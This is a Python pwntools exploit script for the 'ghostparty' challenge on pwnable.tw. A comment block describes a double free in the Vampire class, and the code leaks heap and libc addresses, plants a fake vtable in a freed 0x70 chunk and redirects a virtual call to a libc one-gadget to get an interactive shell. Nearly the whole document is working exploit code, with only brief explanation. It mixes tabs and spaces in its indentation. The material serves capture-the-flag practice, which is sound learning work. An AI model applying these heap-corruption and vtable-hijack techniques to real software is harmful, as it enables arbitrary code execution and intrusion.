from pwn import *

'''
https://pwnable.tw => ghostparty(450pt)
This binary is presented with a c ++ source file.

Leak Vulnerability is very easy!! => Occurs in various places in the class

And...

Object habe vatble(heap chunk) of size 0x70
We can alloc 0x70!! -> fastbin dups(attack)

In Vampire class, If you choice 3 in smalllist()
free is occur twice!!

When index 0(smallist choice 3) freed, vtable(0x70) of index 1 will be free...

Because, We can control vtable of index 1 not freed

At this time..
Free vtable of object -> Alloc heap 0x70 size using New object name or msg, blood of Vampire_class 

After,

menu 2. show ghost is virtual function!!

0x563c301354cb    call   qword ptr [rax + 0x10]

$rax is vtable that we can control!! 
'''

context.log_level='debug'

def Add_Alan(name,age,msg,lightsaber,smallist):

	#This type will be use to leak heap address 
	s.recvuntil('Your choice :')
	s.sendline('1')
	s.recvuntil('Name : ')
	s.sendline(name)
	s.recvuntil('Age : ')
	s.sendline(str(age))
	s.recvuntil('Message : ')
	s.sendline(msg)
	s.recvuntil('Choose a type of ghost :')
	s.sendline('10') #Alan
	s.recvuntil('Your lightsaber : ')
	s.sendline(lightsaber)

	s.recvuntil('Your choice :')
	s.sendline(str(smallist))	

def Add_Vampire(name,age,msg,blood,smallist):
	
	#This type will be use to leak Libc address
        s.recvuntil('Your choice :')
        s.sendline('1')
        s.recvuntil('Name : ')
        s.sendline(name)
        s.recvuntil('Age : ')
        s.sendline(str(age))
        s.recvuntil('Message : ')
        s.sendline(msg)
        s.recvuntil('Choose a type of ghost :')
        s.sendline('7') #Alan
	s.recvuntil('Add blood :')
	s.sendline(blood)
	
        s.recvuntil('Your choice :')
        s.sendline(str(smallist))

	
def Show(index,until=False):
	s.recvuntil('Your choice :')
	s.sendline('2')
	s.recvuntil('Choose a ghost which you want to show in the party : ')
	s.sendline(str(index))

	if until is not False:
		s.recvuntil(until)
		return u64(s.recv(6).ljust(8,'\x00'))

def Remove(index):
        s.recvuntil('Your choice :')
        s.sendline('4')
        s.recvuntil('Choose a ghost which you want to remove from the party :')
        s.sendline(str(index))


	
if __name__ == "__main__":

	s=process('./ghostparty')

	Add_Alan('1',1,'1','A'*0x10,1) #index 0

	heap=Show(0,'Lightsaber : ')

	Add_Vampire('1','1','A'*0x7f,'B'*0x7f,1) #index 1
	Remove(1)
	Add_Vampire('1','1','A'*0x8,'B'*0x8,1) #index 1

	libc=Show(1,'Blood : BBBBBBBB')

	Add_Vampire('1','1','AAAA','a'*0x60,3) #index 2
	Add_Vampire('2','2','BBBB','b'*0x60,1) #index 3

	Remove(2)

	heap_base=heap-0x12c30
	libc_base=libc-0x3c4b78
	oneshot=libc_base+0xf02a4-0x10
	
	fake_vtable=heap_base+0x13160

	payload=p64(fake_vtable)
	payload+=p64(0x2)
	payload+=p64(fake_vtable)*2
	payload+=p64(0x7)
	payload+="Vampire\x00"
	payload+=p64(fake_vtable)*2
	payload+=p64(0x4)
	payload+="\x00"*(0x60-len(payload))

	Add_Vampire('1'*0x60,'3',p64(oneshot)*(0x60/8),payload,1)

	Show(2)

	print "fake_table: "+str(hex(fake_vtable))
	print "Heap leak: "+str(hex(heap))
	print "Libc leak: "+str(hex(libc))
	print "Libc base: "+str(hex(libc_base))

	s.interactive()

	
